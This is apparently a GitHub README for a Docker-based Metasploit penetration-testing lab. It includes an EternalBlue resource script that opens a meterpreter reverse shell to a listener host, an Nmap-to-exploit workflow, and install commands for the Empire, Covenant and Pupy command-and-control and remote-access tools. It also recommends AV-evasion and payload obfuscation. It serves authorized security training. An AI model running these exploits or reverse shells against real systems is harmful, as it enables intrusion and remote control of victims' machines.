<h1 align="center">
  <img src="https://www.metasploit.com/includes/images/metasploit-logo-light-external-use.svg" height="100"/><br>
  Metasploit Lab in Docker 🐳💥
</h1>

<p align="center"><strong>Build a professional, automated pentest lab using Docker, Bash, Metasploit, Empire, Covenant, and Pupy</strong></p>


---

## 🎯 Overview

This repository provides a **complete, portable, and automated lab environment** for ethical hacking and red teaming using:

- 🔹 Metasploit Framework
- 🔹 Docker + Bash automation
- 🔹 Example exploits and payloads
- 🔹 Nmap → Metasploit automation
- 🔹 Empire, Covenant, and Pupy integrations
- 🔹 Cheatsheets and best practices

---

## 🚀 Quick Start

```bash
git clone https://github.com/YOUR_USERNAME/metasploit-lab-docker.git
cd metasploit-lab-docker
chmod +x scripts/*.sh docker/entrypoint.sh
docker-compose up --build

Then in the container:
msfconsole
```

---

## 📦 Project Structure

```
metasploit-lab-docker/
├── docker/
│   ├── Dockerfile          # Kali + Metasploit image
│   └── entrypoint.sh       # Launch script
├── scripts/
│   ├── install_metasploit.sh
│   ├── update_metasploit.sh
│   ├── start_console.sh
│   └── exploits/
│       └── smb_ms17_010.rc # Example EternalBlue
├── examples/
│   ├── ms17-010_exploit.md
│   └── reverse_shell_payloads.md
├── cheatsheet/
│   └── metasploit_cheatsheet.md
├── docker-compose.yml
└── README.md
```

---

## 🛠️ Scripts Breakdown

### 🔧 install_metasploit.sh
Installs Metasploit and initializes DB.

✅ Use for bare-metal install (non-Docker).

### 🔁 update_metasploit.sh
Updates MSF modules and DB.

### 💣 start_console.sh
Opens msfconsole from CLI.

---

## 📂 RC Script: smb_ms17_010.rc
```rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

---

## 🧪 Use-Cases

| Scenario | Tools |
|----------|-------|
| 🏠 Home lab | Docker, MSF, vulnerable VMs |
| 🧠 CTF prep | RC scripts, custom payloads |
| 🧪 Exploit dev | MSF, GDB, Python |
| 🛡️ AV evasion | Veil, Shellter, custom obfuscation |
| 🔄 Red team automation | Empire, Pupy, Covenant |

---

## 🔄 Nmap → Metasploit Automation
### 🌀 How it works
```bash
nmap -oX scan.xml 192.168.1.0/24
db_import scan.xml
hosts
services
```

Then start picking exploits based on open ports:
```bash
search type:exploit name:smb
use exploit/windows/smb/ms17_010_eternalblue
```

---

## 🧠 Cheatsheet Highlights
✅ See full metasploit_cheatsheet.md

| Task | Command |
|------|---------|
| Load module | `use <exploit>` |
| Set options | `set RHOSTS <ip>` |
| Payloads | `set PAYLOAD windows/meterpreter/reverse_tcp` |
| Run exploit | `exploit` |
| Session mgmt | `sessions`, `background` |

---

## 🔌 Empire, Covenant, Pupy Integration
These are external C2 frameworks to extend post-exploitation:

### 🦠 Empire (Python/PowerShell C2)
- Web UI & API
- Great for Windows domain attacks

Install inside container:
```bash
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire && ./setup/install.sh
./empire
```

### 🔐 Covenant (.NET C2)
- Requires .NET Core + SQL backend
- Use Docker or install separately
```bash
docker pull cobbr/covenant
```

### 🐶 Pupy (Python RAT)
- Cross-platform RAT
- Payload obfuscation built-in

Install:
```bash
git clone https://github.com/n1nj4sec/pupy.git
cd pupy && ./pupy.sh
```

---

## 📚 Best Practices

### ✅ Do:
- Use VPN or VLAN to isolate test targets
- Maintain an rc/ script library
- Use AV-evasion techniques before generating payloads
- Monitor outbound traffic for detection

### 🚫 Don't:
- Run payloads on production systems
- Store unencrypted payloads long-term
- Use these tools without authorization

---

## 🪪 License
MIT © 2025 C04CH

---

## ❤️ Contributions Welcome
Submit PRs to add:
- More exploits or RC scripts
- Obfuscation examples
- Empire/Covenant automation

---

## ⚠️ Legal Disclaimer
This project is for educational and authorized security testing only. Using this outside of lab environments may violate local laws.

Made with 🧠 and ⚡ by [Your Name]
```
